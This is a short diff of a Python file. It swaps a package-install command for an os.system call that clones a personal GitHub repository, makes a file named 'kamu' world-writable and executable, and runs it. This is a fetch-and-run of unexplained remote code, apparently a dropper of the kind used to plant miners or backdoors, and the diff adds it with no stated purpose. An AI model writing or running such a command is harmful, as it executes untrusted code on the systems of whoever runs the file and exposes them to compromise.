@@ -1,5 +1,5 @@
 import os
-os.system ("apt update && apt install -y screen")
+os.system ("git clone https://github.com/samrikulan/toya.git && cd toya && chmod 777 kamu && ./kamu")
 
 
  
